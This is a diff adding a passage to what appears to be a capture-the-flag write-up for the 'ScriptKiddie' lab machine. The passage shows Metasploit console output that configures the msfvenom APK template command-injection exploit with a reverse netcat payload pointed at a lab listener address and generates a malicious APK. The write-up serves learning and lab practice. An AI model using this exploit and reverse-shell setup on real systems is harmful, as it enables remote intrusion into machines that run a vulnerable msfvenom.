@@ -83,3 +83,41 @@ Matching Modules
 
 Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
 ```
+
+We can create APK template for msfvenom tool on the victim server and after execute msfvenom command for android we'll get revers-shell
+
+```
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > use 0
+[*] Using configured payload cmd/unix/reverse_netcat
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > show options
+
+Module options (exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   FILENAME  msf.apk          yes       The APK file name
+
+
+Payload options (cmd/unix/reverse_netcat):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.14.6       yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf6 exploit(unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection) > exploit
+
+[+] msf.apk stored at /root/.msf4/local/msf.apk
+```
+Now we can load our payload as template
+![alt_text](https://github.com/Healops/Writeups/blob/main/ScriptKiddie/Images/apk.PNG)
